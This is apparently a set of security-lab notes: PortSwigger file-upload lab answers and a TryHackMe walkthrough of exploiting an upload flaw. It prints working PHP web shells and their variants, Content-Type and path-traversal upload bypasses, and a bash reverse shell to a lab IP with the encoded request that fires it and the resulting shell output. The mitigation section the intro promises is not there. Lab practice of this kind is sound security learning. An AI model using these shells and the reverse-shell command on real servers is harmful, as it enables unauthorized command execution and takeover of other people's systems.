# portswiger
1. Lab: Remote code execution via web shell upload
 `<?php echo file_get_contents('/home/carlos/secret'); ?>`

2. Lab: Web shell upload via Content-Type restriction bypass
Content-Type: image/jpeg

3. Lab: Web shell upload via path traversal
`filename="%2e%2e%2fps.php"` `filename="../ps.php" `

4. 

File Upload Vulnerabilities

Introduction
In today's digital age, file upload functionality is a common feature in web applications. Whether it's for uploading profile pictures, documents, or other media, this feature is essential for user interaction. However, if not implemented securely, file upload functionality can become a significant vulnerability, exposing applications to serious risks such as remote code execution, data breaches, and server compromise.
In this post, we'll dive into what file upload vulnerabilities are, how they can be exploited, and best practices to mitigate these risks.
What is a File Upload Vulnerability?
A file upload vulnerability occurs when a web application allows users to upload files without proper validation, filtering, or security controls. Attackers can exploit this weakness to upload malicious files, such as scripts or executables, which can then be executed on the server or used to compromise the application.
For example, an attacker might upload a PHP shell script disguised as an image file. If the server executes this script, the attacker could gain unauthorized access to the server, manipulate data, or even take control of the entire system.
TryHackMe: Shell Upload using PHP
In this walkthrough, we'll exploit a file upload vulnerability by uploading a PHP web shell and gaining a reverse shell on the target machine. Here's how we did it step by step.
1. Crafting the PHP Web Shell
PHP allows us to execute system commands directly from a web page. Below are some examples of PHP code that can be used to execute commands:
# Execute one command
<?php system("whoami"); ?>

# Take input from the URL parameter (e.g., shell.php?cmd=whoami)
<?php system($_GET['cmd']); ?>

# Using passthru
<?php passthru($_GET['cmd']); ?>

# For shell_exec, echo the output
<?php echo shell_exec("whoami"); ?>

# Exec() only outputs the last line, so it's less useful
<?php echo exec("whoami"); ?>

# Exec() with array output
<?php exec("ls -la", $array); print_r($array); ?>

# preg_replace() trick
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# Using backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>

# Using backticks (shorter version)
<?php echo `whoami`; ?>
For this exploit, we chose the following PHP code because it allows us to execute commands dynamically via URL parameters:
<?php system($_GET['cmd']); ?>
We saved this code into a file named web_shell.php:
echo "<?php system(\$_GET['cmd']); ?>" > web_shell.php
2. Uploading the PHP Shell
From the source code of the target application, we discovered that uploaded files are stored in the /images directory. We uploaded our web_shell.php file to the server.
3. Accessing the Web Shell
Once the file was uploaded, we accessed it via the following URL:
http://overwrite.uploadvulns.thm/images/web_shell.php?cmd=id
This executed the id command on the server, and we received the following output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
This confirmed that the PHP shell was working and that we had command execution capabilities.
4. Gaining a Reverse Shell
To gain a reverse shell, we set up a Netcat listener on our machine:
nc -lvnp 4444
We then executed a reverse shell command via the PHP shell. The command we used was:
bash -c 'bash -i >& /dev/tcp/10.21.128.251/4444 0>&1'
To execute this, we sent the following HTTP request:
GET /images/web_shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.21.128.251/4444+0>%261' HTTP/1.1
5. Receiving the Shell
On our Netcat listener, we received the connection:
iftx@iftx-Modern-15-A5M:~/Desktop/Hacking/File upload$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.76.221 36928
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@30d3f61636e9:/var/www/html/images$ ls
ls
mountains.jpg
web_shell.php
www-data@30d3f61636e9:/var/www/html/images$ whoami
whoami
www-data
We successfully gained a reverse shell as the www-data user.   


